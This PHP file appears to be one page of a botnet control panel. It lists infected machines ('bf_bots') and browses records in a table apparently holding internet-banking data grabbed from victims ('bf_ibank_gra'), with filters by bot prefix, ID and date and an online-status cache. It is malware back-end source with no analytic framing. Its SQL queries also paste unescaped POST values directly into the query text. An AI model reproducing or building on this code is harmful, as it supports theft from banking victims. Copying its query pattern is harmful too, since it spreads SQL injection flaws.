<?php

get_function('html_pages');
get_function('size_format');
get_function('strtotime');
get_function('smarty_assign_add');

$_SESSION['user']->config['cp']['ibnkgra'] = '100';

if(!empty($_SESSION['user']->config['prefix'])){
	$_POST['prefix'] = $_SESSION['user']->config['prefix'];
}

if(isset($_POST['prefix'])){
	$_SESSION['search']['ibank']['prefix'] = $_POST['prefix'];
}

if(isset($_POST['uid'])){
	$_SESSION['search']['ibank']['uid'] = $_POST['uid'];
}

if(isset($_POST['date'])){
	$_SESSION['search']['ibank']['date'] = $_POST['date'];
}

$filter = '';
if(count($_SESSION['search']['ibank'])){
	if(!empty($_SESSION['search']['ibank']['uid'])){
		$uid = explode('0', $_SESSION['search']['ibank']['uid'], 2);
		if(!empty($uid[0]) && !empty($uid[1])){
			if(file_exists('cache/prefix/' . strtoupper($uid[0]))){
				$_SESSION['search']['ibank']['prefix'] = $uid[0];
				$_SESSION['search']['ibank']['uid'] = '0' . $uid[1];
			}
		}
	}

	foreach($_SESSION['search']['ibank'] as $key => $value){
	    if(!empty($value)){
			switch($key){
				case 'prefix':
					if($value != 'ALL'){
						if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
						$filter .= ' (a.prefix = \''.$value.'\') ';
					}
				break;

				case 'uid':
					if($value != 'ALL'){
						if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
						$filter .= ' (a.uid = \''.$value.'\') ';
					}
				break;

				case 'date':
	            	if($value != 'ALL'){
						if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
						$filter .= ' (a.post_date LIKE \''.$value.'%\') ';
					}
				break;
			}
	    }
	}
}

//if(!empty($filter)) $filter = 'WHERE ' . $filter;
/*
function get_files($row){	global $files, $mysqli, $filter;
    //$item = $mysqli->query('SELECT a.id, a.prefix, a.uid, a.pid, a.hwnd, MAX(a.post_date) post_date, a.grp, COUNT(a.id) count, (SELECT b.comment FROM bf_comments b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (uniq = a.grp) AND (b.type = \'ibnkgra\') LIMIT 1) comment FROM bf_ibank_gra a WHERE (a.prefix = \''.$row->prefix.'\') AND (a.uid = \''.$row->uid.'\') GROUP by grp', null, null, false);
	$files[$row->prefix . $row->uid] = $row;
}
*/
//$mysqli->query('SELECT a.id, a.prefix, a.uid, a.pid, a.hwnd, MAX(a.post_date) post_date, a.grp, COUNT(a.id) count, (SELECT b.comment FROM bf_comments b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (uniq = a.grp) AND (b.type = \'ibnkgra\') LIMIT 1) comment FROM bf_ibank_gra a '.$filter.' LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['ibnkgra'] : $Cur['page']*$_SESSION['user']->config['cp']['ibnkgra'] . ',' . $_SESSION['user']->config['cp']['ibnkgra']), null, 'get_files', false);
//$files = $mysqli->query('SELECT a.*, (SELECT b.comment FROM bf_comments b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (uniq = a.grp) AND (b.type = \'ibnkgra\') LIMIT 1) comment FROM bf_ibank_gra a '.$filter.' GROUP by grp LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['ibnkgra'] : $Cur['page']*$_SESSION['user']->config['cp']['ibnkgra'] . ',' . $_SESSION['user']->config['cp']['ibnkgra']), null, null, false);
$files = $mysqli->query('SELECT a.prefix, a.uid, a.grp, MAX(a.post_date) post_date, COUNT(id) count, (SELECT b.comment FROM bf_comments b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.type = \'ibnkgra\') LIMIT 1) comment FROM bf_ibank_gra a '.$filter.' GROUP by a.prefix, a.uid ORDER by a.post_date DESC LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['ibnkgra'] : $Cur['page']*$_SESSION['user']->config['cp']['ibnkgra'] . ',' . $_SESSION['user']->config['cp']['ibnkgra']), null, null, false);
//print_rm($mysqli->sql);
$date = $mysqli->query_cache('SELECT DATE_FORMAT(post_date, \'%Y-%m-%d\') date from bf_ibank_gra GROUP by DATE_FORMAT(post_date, \'%Y-%m-%d\') ORDER by post_date DESC', null, 60, true);
$counts = $mysqli->query_name('SELECT COUNT(DISTINCT a.prefix, a.uid) count FROM bf_ibank_gra a '.$filter, null, 'count', 0, true);
//$counts = $mysqli->query_name('SELECT COUNT(DISTINCT(grp)) count FROM bf_ibank_gra a '.$filter, null, 'count', 0, true);

if(!file_exists('cache/online_bot.json') || (time() - filemtime('cache/online_bot.json')) >= ($config['live']*60)){
	$online = array();
	function online_check($row){
		global $online;
		$online[$row->prefix][$row->uid] = 1;
	}
	$mysqli->query('SELECT prefix, uid FROM bf_bots WHERE (last_date > \''.(time()-($config['live']*60)).'\')', null, 'online_check');
	file_put_contents('cache/online_bot.json', json_encode($online));
}else{
	$online = json_decode(file_get_contents('cache/online_bot.json'), true);
}
$smarty->assign("online", $online);

$prefix = scandir('cache/prefix/', false);
unset($prefix[0], $prefix[1]);
$smarty->assign("prefix", $prefix);

$smarty->assign('pages', @html_pages('/cabs/ibank.html?', $counts, $_SESSION['user']->config['cp']['ibnkgra'], 1, 'bots_list', 'this.href'));
$smarty->assign('date',$date);
$smarty->assign('counts',$counts);
$smarty->assign('files',$files);
$smarty->assign('Cur', $Cur);

?>